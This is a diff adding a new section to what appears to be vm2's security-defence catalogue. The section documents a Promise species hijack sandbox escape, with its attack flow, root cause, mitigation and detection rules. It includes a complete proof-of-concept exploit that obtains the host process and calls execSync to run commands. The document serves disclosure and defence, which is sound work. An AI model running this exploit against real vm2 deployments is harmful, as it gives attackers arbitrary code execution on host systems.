@@ -2416,6 +2416,109 @@ We deliberately do **not** wrap on the proto-walk fall-through paths (null proto
 
 ---
 
+## Attack Category 31: Promise Species Hijack in `localPromise` Swallow Tail
+
+**Uses**: [Category 4: Error Object Exploitation](#attack-category-4-error-object-exploitation), [Category 7: Promise and Async Exploitation](#attack-category-7-promise-and-async-exploitation), [Category 18: Array Species Self-Return via Constructor Manipulation](#attack-category-18-array-species-self-return-via-constructor-manipulation).
+
+**Supersedes**: extends [Category 22: Promise Executor Unhandled Rejection — Host Process DoS](#attack-category-22-promise-executor-unhandled-rejection--host-process-dos) — the swallow-tail call introduced there is the bypass surface.
+
+### Description
+
+The `localPromise` constructor (added in GHSA-hw58-p9xv-2mjh) attaches an internal swallow tail to every sandbox-constructed Promise by invoking the cached host `Promise.prototype.then`:
+
+```javascript
+apply(globalPromisePrototypeThen, this, [undefined, localPromiseSwallow]);
+```
+
+The host `then` resolves the downstream child of this chain via the **species protocol**: it reads `this.constructor[Symbol.species]` and `Construct`s a new Promise with that constructor. The sandbox-side `then`/`catch`/`Reflect.apply` overrides call `resetPromiseSpecies(this)` first to clobber `constructor` so species always resolves to `localPromise` — but the swallow-tail call inside the `localPromise` constructor itself did **not**.
+
+A sandbox subclass `class FakePromise extends Promise { static get [Symbol.species]() { return ct; } }` therefore hijacks the species protocol to a user function `ct`. V8 calls `new ct(internalExecutor)` where `internalExecutor` is its internal `(resolve, reject)` capability builder. `ct` receives V8's resolve/reject and re-binds them — for example, `ct = function(e) { e(userFn, userCollector) }` makes `userFn` V8's "resolve" and `userCollector` V8's "reject".
+
+Combined with the recursion-overflow primitive from Category 29 (`function so(d) { if (d > 0) so(d-1); const e = new E(); e.stack; throw e; }`), the attacker drives V8 to raise a host-realm `RangeError` inside `PromiseResolveThenableJob`. V8's resolver catches the throw and delivers the raw host Error to `userCollector` — bypassing every sandbox sanitiser. `ex.constructor.constructor("return process")()` yields the host `process` and `child_process.execSync` runs arbitrary commands.
+
+CWE-913 (Improper Control of Dynamically-Managed Code Resources). CVSS 9.8 (Critical).
+
+### Attack Flow
+
+1. Sandbox declares `class FakePromise extends Promise` with `static get [Symbol.species]() { return ct }` where `ct` is a user-controlled function.
+2. Sandbox sets `ct = (executor) => executor(userResolve, userReject)`, where `userReject` is a sandbox collector that captures whatever value V8 hands it.
+3. Sandbox constructs `new FakePromise(r => r())`. This enters `localPromise`'s constructor. The instance's `[[Prototype]]` chain is `FakePromise.prototype → localPromise.prototype → Promise.prototype`; `this.constructor` walks to `FakePromise`.
+4. The constructor attaches the swallow tail: `apply(globalPromisePrototypeThen, this, [undefined, swallow])`. Host `then` runs `SpeciesConstructor(this, %Promise%)` → reads `FakePromise[Symbol.species]` → returns `ct`. V8 builds an internal executor `internalExecutor(resolve, reject)` and calls `Construct(ct, [internalExecutor])`. `ct` invokes `internalExecutor(userResolve, userReject)` — V8 now thinks `userReject` is the child's reject function.
+5. Sandbox triggers a host-realm rejection in the downstream chain (e.g., via deep recursion + `e.stack` formatting → host `RangeError`). V8's `PromiseResolveThenableJob` catches the throw and calls the child's reject — which is `userReject`. The raw host `RangeError` lands in sandbox.
+6. Sandbox reads `ex.constructor.constructor("return process")()` → host `Function` constructor → `process` → RCE.
+
+### Canonical Example
+
+```javascript
+// (advisory GHSA-76w7-j9cq-rx2j)
+const { VM } = require('vm2');
+new VM().run(`
+  class E extends Error {}
+  function so(d) {
+    if (d > 0) so(d-1);
+    const e = new E();
+    e.stack;
+    throw e;
+  }
+  let ex, ct;
+  class FakePromise extends Promise {
+    static get [Symbol.species]() { return ct; }
+  }
+  function doCatch(f) {
+    ex = undefined;
+    const p = Promise.withResolvers();
+    ct = function(e) { e(f, v => { ex = v; p.resolve(); }) };
+    new FakePromise(r => r());
+    return p.promise;
+  }
+  (async function f(s) {
+    let min = s, max = 100000;
+    while (min < max) {
+      const mid = (min + max) >> 1;
+      await doCatch(() => so(mid));
+      if (ex.name === "RangeError" && !(ex instanceof RangeError)) {
+        ex.constructor.constructor("return process")()
+          .mainModule.require('child_process').execSync('touch pwned');
+        return;
+      }
+      if (ex instanceof E) min = mid + 1; else max = mid;
+    }
+    f(s + 1);
+  })(0);
+`);
+```
+
+### Why It Works
+
+The Category 22 swallow tail was designed to **silence** unhandled rejections without participating in user-visible Promise mechanics — so it uses the cached native `then` (`globalPromisePrototypeThen`) to avoid recursing through vm2's `.then` override. But the cached native `then` is still the **specification-mandated** `then`, which performs species resolution. The cached-`then` design correctly avoided the `.then` override recursion; it did not account for the species protocol that runs *inside* that native `then`.
+
+Every other call site that touches a host `then`/`catch` (`globalPromise.prototype.then` override, `globalPromise.prototype.catch` override, `localReflect.apply` wrapper) bookends with `resetPromiseSpecies(this)`. The swallow-tail site — inside `localPromise`'s own constructor body — was the only one missing the reset, because `resetPromiseSpecies` is declared later in the module and was thought to be unreachable from the constructor's lexical scope. In practice the constructor body executes lazily (user code triggers it via `new Promise(...)`), by which point the module has fully initialised and the reset is in scope.
+
+The species hijack is the same primitive as Category 18 (Array species self-return), now applied to Promise instead of Array. The structural lesson is identical: **every call into a host built-in that uses `SpeciesConstructor` must first neutralise the species on `this`**.
+
+### Mitigation
+
+Add `resetPromiseSpecies(this)` immediately before the swallow-tail `apply(globalPromisePrototypeThen, this, [undefined, localPromiseSwallow])` call in the `localPromise` constructor. This pins `this.constructor` to `localPromise` as an own data property, shadowing any inherited species accessor on `FakePromise`. The species protocol then resolves to `localPromise`, and the downstream child is constructed via `localPromise`'s own wrapped executor (Category 22) — V8's internal `(resolve, reject)` capability cannot be rebound by a sandbox-controlled constructor.
+
+Together with the existing wrapped executor and the `localPromiseInSwallowTail` re-entrancy guard, this restores **[Defense Invariant #4](#defense-invariants)** (no host built-in is invoked with a sandbox `this` whose species can be hijacked) for the swallow-tail call site, and closes the path through which raw host-realm errors reached the `userReject` collector.
+
+The fix preserves benign subclass behaviour: `class MyPromise extends Promise {}` still works because `MyPromise` does not override `Symbol.species`, so species would naturally resolve to `MyPromise` itself; the reset only matters when an attacker installs a malicious species. The user-visible `myPromise.constructor` is mutated to `localPromise` by the reset — the same observable change already produced by every `.then()`/`.catch()`/`Reflect.apply` call, so this is consistent with the existing invariant.
+
+### Detection Rules
+
+- **`class X extends Promise { static get [Symbol.species]() { return userFn } }`** — any sandbox subclass of Promise that overrides `Symbol.species` is suspect. After the fix, the species value is ignored for any call site vm2 controls, but the pattern remains an indicator of attempted hijack.
+- **User function `ct` that receives the species `Construct` call and re-invokes the V8 internal executor with sandbox-controlled `(resolve, reject)`** — Category-22-style closures over the V8 resolver are the canonical attack shape.
+- **Synchronous resolution of a Promise immediately followed by inspection of a captured rejection value** — `new FakePromise(r => r())` constructed solely to trigger the swallow tail (then the downstream child's reject) is a tell-tale signature.
+- **Composition with the recursion-overflow primitive (Category 29)** or any other host-error generator inside the downstream chain — the species hijack is the transport; the host error is the payload.
+
+### Considered Attack Surfaces
+
+- **Other host-`then` call sites.** `sanitizeAsyncIteratorResultPromise` (the Category 29 fix) also calls `apply(globalPromisePrototypeThen, promise, [...])` on a promise produced by V8's async generator machinery. That promise is intrinsic — its `constructor` walks to `globalPromise` and species resolves to `globalPromise` by default — so the species channel is not user-controlled there. Adding a defensive `resetPromiseSpecies(promise)` is a harmless belt-and-suspenders option but is not required for this advisory.
+- **Benign subclasses without species override.** `class MyPromise extends Promise {}` (no `[Symbol.species]`) is unaffected — species would naturally resolve to `MyPromise`; the reset only flips it to `localPromise`. The pinned `localPromise` constructor is fully compatible with subclass semantics (the outer instance is still a `MyPromise`; only the internal swallow-tail child is `localPromise`, and that child is never returned to user code).
+- **Frozen `Promise.prototype.constructor`.** `resetPromiseSpecies` defines an own data property on the instance, not on the prototype. Even if a hostile sandbox tried to make the prototype's `constructor` non-configurable (which the bridge prevents), the own-property write would still shadow it. The reset throws a `LocalError` only if the instance itself is non-extensible or has a non-configurable `constructor` — in which case the outer try/catch in the swallow-tail block swallows it harmlessly and the rest of the constructor proceeds.
+
+---
+
 ## Considered Attack Surfaces
 
 These attack surfaces were analyzed and found to be safe or low-risk. They are documented here so future reviewers do not re-investigate them.
@@ -2502,6 +2605,7 @@ The most dangerous attacks combine multiple categories. Each pattern references 
 21. **Host Built-in Identity Leak via Proto Walk** [Categories 1, 2, 8] (NOW FIXED): Walk the prototype chain via `({}).__lookupGetter__('__proto__')` composed with `Buffer.apply` (or any host-bound `__proto__` getter) to terminate at host `Object.prototype`, then read `.constructor` to obtain a *reference* to host `Object` whose identity is disjoint from sandbox `Object`. The original symbol-filter patch (commit `67bc511`) closed the demonstrated RCE payload but left this primitive intact — any future bypass that turns "I have a host built-in handle" into "I can read a host symbol or call a host method that bypasses bridge sanitisation" would re-enable the same escape class. Closed structurally by `thisAddIdentityMapping` in `lib/bridge.js` (see Category 8 mitigation).
 22. **Async Generator yield*-Return Thenable + Stack-Overflow Realm Skew** [Categories 4, 7, 29] (NOW FIXED): Use `yield*` to a no-`return` inner async iterator, then `.return(thenable)` where the thenable's `.then` synchronously throws via deep recursion. V8's `PromiseResolveThenableJob` captures the throw and the yield* continuation surfaces it as `{ value, done: false }` — bypassing both the transformer's user-`catch` instrumentation and the `globalPromise.prototype.then` rejection sanitiser. Binary-search the recursion depth where the overflow originates inside V8's host C++ code so the `RangeError` is host-realm, then `e.constructor.constructor("return process")()`. Closed by wrapping `%AsyncGeneratorPrototype%.next/.return/.throw` to route iterator-result `.value` and rejections through `handleException`, plus replacing every thenable arg with a sandbox-realm wrapper whose `.then` is a fixed `safeThen` and always-shadowing the non-function branch so V8's re-read of `.then` cannot observe attacker-controlled values.
 23. **Host Prototype Mutation via Apply-Trap Indirection + WebAssembly Rejection** [Categories 2, 4, 7, 30] (NOW FIXED): Resolve host `Object.prototype.__proto__` setter via `Buffer.call.call({}.__lookupSetter__, Buffer, "__proto__")` (the `connect()`-aliased sandbox `__lookupSetter__` walks back to host). Trigger a host-realm `TypeError` (e.g., `await WebAssembly.compileStreaming()`). Inside `catch(e)`, call `setProto.call(getProto.call(e), null)` — the apply trap unwraps `context` and forwards to the host setter, severing host `TypeError.prototype.[[Prototype]]` without any write trap firing. The next host `TypeError` from `await WebAssembly.compileStreaming()` walks back into sandbox code through V8 async internals; the bridge's proto-walk no longer finds the registered mapping at the right level and the value falls through unwrapped. `e.constructor.constructor` is then host `Function`. Closed structurally by (A) caching host prototype-mutating intrinsics (`Object.prototype.__proto__` setter, `Object.setPrototypeOf`, `Reflect.setPrototypeOf`, `Object.{defineProperty,defineProperties}`, `Reflect.defineProperty`, `Object.prototype.__define{Getter,Setter}__`) and refusing them in the apply trap with one layer of indirection peel for `Function.prototype.{call,apply,bind}` and `Reflect.{apply,construct}`; (B) cache-check on `mappingOtherToThis` before the proto-walk in `thisEnsureThis` so any previously-bridged host value returns the existing proxy even with a tampered proto chain.
+24. **Promise Species Hijack + Stack-Overflow Realm Skew** [Categories 4, 7, 18, 29, 31] (NOW FIXED): `class FakePromise extends Promise { static get [Symbol.species]() { return ct } }` reroutes the swallow-tail child constructor inside `localPromise` to a sandbox-controlled `ct`. `ct` rebinds V8's internal `(resolve, reject)` capability to a sandbox collector; trigger a host-realm `RangeError` via `e.stack` after deep recursion (binary-searched depth) inside the downstream chain; V8's `PromiseResolveThenableJob` delivers the raw host Error to the collector — `ex.constructor.constructor("return process")()` then yields RCE. Closed by adding `resetPromiseSpecies(this)` immediately before the swallow-tail `apply(globalPromisePrototypeThen, this, ...)` call so the species protocol always resolves to `localPromise` regardless of the user's subclass `Symbol.species` override.
 
 ### How The Bridge Defends
 
@@ -2510,7 +2614,7 @@ The most dangerous attacks combine multiple categories. Each pattern references 
 | Constructor chain | Returns `{}` for Function constructor access; `isThisDangerousFunctionConstructor` blocks all variants |
 | __proto__ access | Intercepts and returns sandbox-side prototype |
 | Proxy traps | Wraps Proxy constructor, sanitizes handler objects, null-prototype handlers |
-| Symbol.species (Promise) | Unconditionally sets `p.constructor = localPromise` as own data property before every `.then()`/`.catch()` (eliminates TOCTOU) |
+| Symbol.species (Promise) | Unconditionally sets `p.constructor = localPromise` as own data property before every `.then()`/`.catch()` **and before the internal swallow-tail call in `localPromise`'s constructor** (GHSA-76w7-j9cq-rx2j); eliminates TOCTOU and species hijack via subclass `[Symbol.species]` |
 | Symbol.species (Array) | Three-layer defense: set/defineProperty traps + neutralizeArraySpecies in apply trap |
 | Reflect.construct instanceof bypass | `resetPromiseSpecies` sets constructor on any object, not just `instanceof globalPromise` |
 | Species TOCTOU via accessor | Own data property set by `Reflect.defineProperty`; no getter invoked |
